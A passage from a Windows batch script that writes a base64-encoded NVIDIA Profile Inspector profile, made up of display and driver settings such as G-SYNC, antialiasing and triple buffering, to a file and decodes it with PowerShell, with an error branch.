echo Zm8+RGlzcGxheSB0aGUgUGh5c1ggaW5kaWNhdG9yPC9TZXR0aW5nTmFtZUluZm8+>> "!_NVNIP_B64!"
echo DQogICAgICAgIDxTZXR0aW5nSUQ+Mjc4MTk2NTkxPC9TZXR0aW5nSUQ+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxTZXR0aW5nVmFsdWU+ODc3ODcxMjA0PC9TZXR0aW5nVmFsdWU+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmls>> "!_NVNIP_B64!"
echo ZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0>> "!_NVNIP_B64!"
echo aW5nTmFtZUluZm8+VlJSIHJlcXVlc3RlZCBzdGF0ZTwvU2V0dGluZ05hbWVJbmZv>> "!_NVNIP_B64!"
echo Pg0KICAgICAgICA8U2V0dGluZ0lEPjI3ODE5NjcyNzwvU2V0dGluZ0lEPg0KICAg>> "!_NVNIP_B64!"
echo ICAgICA8U2V0dGluZ1ZhbHVlPjE8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZh>> "!_NVNIP_B64!"
echo bHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGlu>> "!_NVNIP_B64!"
echo Zz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1l>> "!_NVNIP_B64!"
echo SW5mbz5EaXNwbGF5IHRoZSBWUlIgT3ZlcmxheSBJbmRpY2F0b3I8L1NldHRpbmdO>> "!_NVNIP_B64!"
echo YW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4yNzgyNjIxMjc8L1NldHRpbmdJ>> "!_NVNIP_B64!"
echo RD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4xPC9TZXR0aW5nVmFsdWU+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmls>> "!_NVNIP_B64!"
echo ZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0>> "!_NVNIP_B64!"
echo aW5nTmFtZUluZm8+VmFyaWFibGUgcmVmcmVzaCBSYXRlPC9TZXR0aW5nTmFtZUlu>> "!_NVNIP_B64!"
echo Zm8+DQogICAgICAgIDxTZXR0aW5nSUQ+Mjc5NDc2Njg2PC9TZXR0aW5nSUQ+DQog>> "!_NVNIP_B64!"
echo ICAgICAgIDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8>> "!_NVNIP_B64!"
echo VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0>> "!_NVNIP_B64!"
echo aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05h>> "!_NVNIP_B64!"
echo bWVJbmZvPkctU1lOQzwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z0lEPjI3OTQ3NjY4NzwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVl>> "!_NVNIP_B64!"
echo PjA8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFs>> "!_NVNIP_B64!"
echo dWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxl>> "!_NVNIP_B64!"
echo U2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz4gPC9TZXR0aW5nTmFt>> "!_NVNIP_B64!"
echo ZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+MjgxMTA2NjA1PC9TZXR0aW5nSUQ+>> "!_NVNIP_B64!"
echo DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAg>> "!_NVNIP_B64!"
echo ICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVT>> "!_NVNIP_B64!"
echo ZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z05hbWVJbmZvPkFuaXNvdHJvcGljIGZpbHRlcmluZyBtb2RlPC9TZXR0aW5nTmFt>> "!_NVNIP_B64!"
echo ZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+MjgyMjQ1OTEwPC9TZXR0aW5nSUQ+>> "!_NVNIP_B64!"
echo DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MTwvU2V0dGluZ1ZhbHVlPg0KICAgICAg>> "!_NVNIP_B64!"
echo ICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVT>> "!_NVNIP_B64!"
echo ZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z05hbWVJbmZvPkFudGlhbGlhc2luZyAtIFRyYW5zcGFyZW5jeSBTdXBlcnNhbXBs>> "!_NVNIP_B64!"
echo aW5nPC9TZXR0aW5nTmFtZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+MjgyMzY0>> "!_NVNIP_B64!"
echo NTQ5PC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MDwvU2V0dGlu>> "!_NVNIP_B64!"
echo Z1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQog>> "!_NVNIP_B64!"
echo ICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0K>> "!_NVNIP_B64!"
echo ICAgICAgICA8U2V0dGluZ05hbWVJbmZvPkFudGlhbGlhc2luZyAtIFNldHRpbmc8>> "!_NVNIP_B64!"
echo L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4yODI1NTUzNDY8>> "!_NVNIP_B64!"
echo L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5nVmFs>> "!_NVNIP_B64!"
echo dWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAg>> "!_NVNIP_B64!"
echo IDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxTZXR0aW5nTmFtZUluZm8+QW50aWFsaWFzaW5nIC0gQmVoYXZpb3IgRmxh>> "!_NVNIP_B64!"
echo Z3M8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4yODM5NTgx>> "!_NVNIP_B64!"
echo NDY8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5n>> "!_NVNIP_B64!"
echo VmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAg>> "!_NVNIP_B64!"
echo ICAgIDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQog>> "!_NVNIP_B64!"
echo ICAgICAgIDxTZXR0aW5nTmFtZUluZm8+Q1VEQSBTeXNtZW0gRmFsbGJhY2sgUG9s>> "!_NVNIP_B64!"
echo aWN5PC9TZXR0aW5nTmFtZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+MjgzOTYy>> "!_NVNIP_B64!"
echo NTY5PC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MDwvU2V0dGlu>> "!_NVNIP_B64!"
echo Z1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQog>> "!_NVNIP_B64!"
echo ICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0K>> "!_NVNIP_B64!"
echo ICAgICAgICA8U2V0dGluZ05hbWVJbmZvPk9wdGltdXMgZmxhZ3MgZm9yIGVuYWJs>> "!_NVNIP_B64!"
echo ZWQgYXBwbGljYXRpb25zPC9TZXR0aW5nTmFtZUluZm8+DQogICAgICAgIDxTZXR0>> "!_NVNIP_B64!"
echo aW5nSUQ+Mjg0ODEwMzY4PC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5nVmFs>> "!_NVNIP_B64!"
echo dWU+MTY8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwv>> "!_NVNIP_B64!"
echo VmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9m>> "!_NVNIP_B64!"
echo aWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5FbmFibGUgYXBw>> "!_NVNIP_B64!"
echo bGljYXRpb24gZm9yIE9wdGltdXM8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAg>> "!_NVNIP_B64!"
echo PFNldHRpbmdJRD4yODQ4MTAzNjk8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRp>> "!_NVNIP_B64!"
echo bmdWYWx1ZT4xNjwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3>> "!_NVNIP_B64!"
echo b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAg>> "!_NVNIP_B64!"
echo PFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPlNoaW0g>> "!_NVNIP_B64!"
echo UmVuZGVyaW5nIE1vZGUgT3B0aW9ucyBwZXIgYXBwbGljYXRpb24gZm9yIE9wdGlt>> "!_NVNIP_B64!"
echo dXM8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4yODQ4MTAz>> "!_NVNIP_B64!"
echo NzI8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5n>> "!_NVNIP_B64!"
echo VmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAg>> "!_NVNIP_B64!"
echo ICAgIDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQog>> "!_NVNIP_B64!"
echo ICAgICAgIDxTZXR0aW5nTmFtZUluZm8+QW50aWFsaWFzaW5nIC0gVHJhbnNwYXJl>> "!_NVNIP_B64!"
echo bmN5IE11bHRpc2FtcGxpbmc8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNl>> "!_NVNIP_B64!"
echo dHRpbmdJRD4yODQ5NjIyMDQ8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdW>> "!_NVNIP_B64!"
echo YWx1ZT4wPC9TZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8>> "!_NVNIP_B64!"
echo L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJv>> "!_NVNIP_B64!"
echo ZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0aW5nTmFtZUluZm8+T3ZlcmxheSBJ>> "!_NVNIP_B64!"
echo bmRpY2F0b3I8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4y>> "!_NVNIP_B64!"
echo ODYzMzU1NzQ8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT41MTwv>> "!_NVNIP_B64!"
echo U2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5>> "!_NVNIP_B64!"
echo cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0>> "!_NVNIP_B64!"
echo aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPlN0ZXJlbyAtIHN3YXAgbW9k>> "!_NVNIP_B64!"
echo ZTwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lEPjI4ODU2ODEx>> "!_NVNIP_B64!"
echo NTwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjA8L1NldHRpbmdW>> "!_NVNIP_B64!"
echo YWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAg>> "!_NVNIP_B64!"
echo ICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAg>> "!_NVNIP_B64!"
echo ICAgICAgPFNldHRpbmdOYW1lSW5mbz5TdGVyZW8gLSBFbmFibGU8L1NldHRpbmdO>> "!_NVNIP_B64!"
echo YW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4yOTYzOTQzOTM8L1NldHRpbmdJ>> "!_NVNIP_B64!"
echo RD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5nVmFsdWU+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmls>> "!_NVNIP_B64!"
echo ZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0>> "!_NVNIP_B64!"
echo aW5nTmFtZUluZm8+U3RlcmVvIC0gU3dhcCBleWVzPC9TZXR0aW5nTmFtZUluZm8+>> "!_NVNIP_B64!"
echo DQogICAgICAgIDxTZXR0aW5nSUQ+Mjk2NjMzMTgwPC9TZXR0aW5nSUQ+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFs>> "!_NVNIP_B64!"
echo dWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5n>> "!_NVNIP_B64!"
echo Pg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJ>> "!_NVNIP_B64!"
echo bmZvPlN0ZXJlbyAtIERpc3BsYXkgbW9kZTwvU2V0dGluZ05hbWVJbmZvPg0KICAg>> "!_NVNIP_B64!"
echo ICAgICA8U2V0dGluZ0lEPjMwMDQ4OTMxMzwvU2V0dGluZ0lEPg0KICAgICAgICA8>> "!_NVNIP_B64!"
echo U2V0dGluZ1ZhbHVlPjQyOTQ5NjcyOTU8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAg>> "!_NVNIP_B64!"
echo PFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0>> "!_NVNIP_B64!"
echo dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdO>> "!_NVNIP_B64!"
echo YW1lSW5mbz5CdWZmZXItZmxpcHBpbmcgbW9kZTwvU2V0dGluZ05hbWVJbmZvPg0K>> "!_NVNIP_B64!"
echo ICAgICAgICA8U2V0dGluZ0lEPjUzODkyNzUxOTwvU2V0dGluZ0lEPg0KICAgICAg>> "!_NVNIP_B64!"
echo ICA8U2V0dGluZ1ZhbHVlPjA8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVl>> "!_NVNIP_B64!"
echo VHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4N>> "!_NVNIP_B64!"
echo CiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5m>> "!_NVNIP_B64!"
echo byAvPg0KICAgICAgICA8U2V0dGluZ0lEPjU0MDUwODczODwvU2V0dGluZ0lEPg0K>> "!_NVNIP_B64!"
echo ICAgICAgICA8U2V0dGluZ1ZhbHVlPjEyODwvU2V0dGluZ1ZhbHVlPg0KICAgICAg>> "!_NVNIP_B64!"
echo ICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVT>> "!_NVNIP_B64!"
echo ZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z05hbWVJbmZvPkZvcmNlIFN0ZXJlbyBzaHV0dGVyaW5nPC9TZXR0aW5nTmFtZUlu>> "!_NVNIP_B64!"
echo Zm8+DQogICAgICAgIDxTZXR0aW5nSUQ+NTQxOTU2NjIwPC9TZXR0aW5nSUQ+DQog>> "!_NVNIP_B64!"
echo ICAgICAgIDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8>> "!_NVNIP_B64!"
echo VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0>> "!_NVNIP_B64!"
echo aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05h>> "!_NVNIP_B64!"
echo bWVJbmZvIC8+DQogICAgICAgIDxTZXR0aW5nSUQ+NTQzMjY2MDA2PC9TZXR0aW5n>> "!_NVNIP_B64!"
echo SUQ+DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MTI4PC9TZXR0aW5nVmFsdWU+DQog>> "!_NVNIP_B64!"
echo ICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJv>> "!_NVNIP_B64!"
echo ZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxT>> "!_NVNIP_B64!"
echo ZXR0aW5nTmFtZUluZm8+RW5hYmxlIG92ZXJsYXk8L1NldHRpbmdOYW1lSW5mbz4N>> "!_NVNIP_B64!"
echo CiAgICAgICAgPFNldHRpbmdJRD41NDM5NTkyMzY8L1NldHRpbmdJRD4NCiAgICAg>> "!_NVNIP_B64!"
echo ICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1>> "!_NVNIP_B64!"
echo ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmlsZVNldHRpbmc+>> "!_NVNIP_B64!"
echo DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0aW5nTmFtZUlu>> "!_NVNIP_B64!"
echo Zm8+T3BlbkdMIEdESSBjb21wYXRpYmlsaXR5PC9TZXR0aW5nTmFtZUluZm8+DQog>> "!_NVNIP_B64!"
echo ICAgICAgIDxTZXR0aW5nSUQ+NTQ0MzkyNjExPC9TZXR0aW5nSUQ+DQogICAgICAg>> "!_NVNIP_B64!"
echo IDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVU>> "!_NVNIP_B64!"
echo eXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0K>> "!_NVNIP_B64!"
echo ICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZv>> "!_NVNIP_B64!"
echo IC8+DQogICAgICAgIDxTZXR0aW5nSUQ+NTQ0NTQzOTQxPC9TZXR0aW5nSUQ+DQog>> "!_NVNIP_B64!"
echo ICAgICAgIDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8>> "!_NVNIP_B64!"
echo VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0>> "!_NVNIP_B64!"
echo aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05h>> "!_NVNIP_B64!"
echo bWVJbmZvPkFudGlhbGlhc2luZyAtIExpbmUgZ2FtbWE8L1NldHRpbmdOYW1lSW5m>> "!_NVNIP_B64!"
echo bz4NCiAgICAgICAgPFNldHRpbmdJRD41NDU4OTgzNDg8L1NldHRpbmdJRD4NCiAg>> "!_NVNIP_B64!"
echo ICAgICAgPFNldHRpbmdWYWx1ZT4xNjwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8>> "!_NVNIP_B64!"
echo VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0>> "!_NVNIP_B64!"
echo aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05h>> "!_NVNIP_B64!"
echo bWVJbmZvPkRlZXAgY29sb3IgZm9yIDNEIGFwcGxpY2F0aW9uczwvU2V0dGluZ05h>> "!_NVNIP_B64!"
echo bWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lEPjU0NjgxNjc1ODwvU2V0dGluZ0lE>> "!_NVNIP_B64!"
echo Pg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjE8L1NldHRpbmdWYWx1ZT4NCiAgICAg>> "!_NVNIP_B64!"
echo ICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxl>> "!_NVNIP_B64!"
echo U2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRp>> "!_NVNIP_B64!"
echo bmdOYW1lSW5mbz5FeHBvcnRlZCBPdmVybGF5IHBpeGVsIHR5cGVzPC9TZXR0aW5n>> "!_NVNIP_B64!"
echo TmFtZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+NTQ3MDIyNDQ3PC9TZXR0aW5n>> "!_NVNIP_B64!"
echo SUQ+DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MTwvU2V0dGluZ1ZhbHVlPg0KICAg>> "!_NVNIP_B64!"
echo ICAgICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2Zp>> "!_NVNIP_B64!"
echo bGVTZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0>> "!_NVNIP_B64!"
echo dGluZ05hbWVJbmZvPlVuaWZpZWQgYmFjay9kZXB0aCBidWZmZXI8L1NldHRpbmdO>> "!_NVNIP_B64!"
echo YW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD41NDc1MjQ2OTM8L1NldHRpbmdJ>> "!_NVNIP_B64!"
echo RD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT40Mjk0OTY3Mjk1PC9TZXR0aW5nVmFs>> "!_NVNIP_B64!"
echo dWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAg>> "!_NVNIP_B64!"
echo IDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxTZXR0aW5nTmFtZUluZm8+VGhyZWFkZWQgb3B0aW1pemF0aW9uPC9TZXR0>> "!_NVNIP_B64!"
echo aW5nTmFtZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+NTQ5NTI4MDk0PC9TZXR0>> "!_NVNIP_B64!"
echo aW5nSUQ+DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0K>> "!_NVNIP_B64!"
echo ICAgICAgICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1By>> "!_NVNIP_B64!"
echo b2ZpbGVTZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8>> "!_NVNIP_B64!"
echo U2V0dGluZ05hbWVJbmZvPlByZWZlcnJlZCBPcGVuR0wgR1BVPC9TZXR0aW5nTmFt>> "!_NVNIP_B64!"
echo ZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+NTUwNTY0ODM4PC9TZXR0aW5nSUQ+>> "!_NVNIP_B64!"
echo DQogICAgICAgIDxTZXR0aW5nVmFsdWU+aWQsMi4wOjIyMDQxMERFLDAwMDAwMTAw>> "!_NVNIP_B64!"
echo LEdGIC0gKDM2OCwyLDE2MSwyNDU3NikgQCAoMCk8L1NldHRpbmdWYWx1ZT4NCiAg>> "!_NVNIP_B64!"
echo ICAgICAgPFZhbHVlVHlwZT5TdHJpbmc8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJv>> "!_NVNIP_B64!"
echo ZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxT>> "!_NVNIP_B64!"
echo ZXR0aW5nTmFtZUluZm8+VnVsa2FuL09wZW5HTCBwcmVzZW50IG1ldGhvZDwvU2V0>> "!_NVNIP_B64!"
echo dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lEPjU1MDkzMjcyODwvU2V0>> "!_NVNIP_B64!"
echo dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjI8L1NldHRpbmdWYWx1ZT4N>> "!_NVNIP_B64!"
echo CiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Q>> "!_NVNIP_B64!"
echo cm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAg>> "!_NVNIP_B64!"
echo PFNldHRpbmdOYW1lSW5mbz5UcmlwbGUgYnVmZmVyaW5nPC9TZXR0aW5nTmFtZUlu>> "!_NVNIP_B64!"
echo Zm8+DQogICAgICAgIDxTZXR0aW5nSUQ+NTUzNTA1MjczPC9TZXR0aW5nSUQ+DQog>> "!_NVNIP_B64!"
echo ICAgICAgIDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8>> "!_NVNIP_B64!"
echo VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0>> "!_NVNIP_B64!"
echo aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05h>> "!_NVNIP_B64!"
echo bWVJbmZvPkV4dGVuc2lvbiBTdHJpbmcgdmVyc2lvbjwvU2V0dGluZ05hbWVJbmZv>> "!_NVNIP_B64!"
echo Pg0KICAgICAgICA8U2V0dGluZ0lEPjU1MzYxMjQzNTwvU2V0dGluZ0lEPg0KICAg>> "!_NVNIP_B64!"
echo ICAgICA8U2V0dGluZ1ZhbHVlPjA8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZh>> "!_NVNIP_B64!"
echo bHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGlu>> "!_NVNIP_B64!"
echo Zz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1l>> "!_NVNIP_B64!"
echo SW5mbyAvPg0KICAgICAgICA8U2V0dGluZ0lEPjEzNDM2NDY4MTQ8L1NldHRpbmdJ>> "!_NVNIP_B64!"
echo RD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5nVmFsdWU+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmls>> "!_NVNIP_B64!"
echo ZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0>> "!_NVNIP_B64!"
echo aW5nTmFtZUluZm8gLz4NCiAgICAgICAgPFNldHRpbmdJRD40Mjk0OTY3Mjk1PC9T>> "!_NVNIP_B64!"
echo ZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVl>> "!_NVNIP_B64!"
echo Pg0KICAgICAgICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8>> "!_NVNIP_B64!"
echo L1Byb2ZpbGVTZXR0aW5nPg0KICAgIDwvU2V0dGluZ3M+DQogIDwvUHJvZmlsZT4N>> "!_NVNIP_B64!"
echo CjwvQXJyYXlPZlByb2ZpbGU+>> "!_NVNIP_B64!"

:: Decode NIP from base64 using PowerShell (preserves UTF-16 encoding exactly)
set "_NIP_B=!_NVNIP_B64!"
set "_NIP_O=!_NVNIP!"
powershell -NoProfile -Command "[IO.File]::WriteAllBytes($env:_NIP_O,[Convert]::FromBase64String([IO.File]::ReadAllText($env:_NIP_B).Trim()))" >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo  [FAIL] Could not decode NIP profile
    set STEP_ERR=1
    goto :NVIDIA_CLEANUP
)

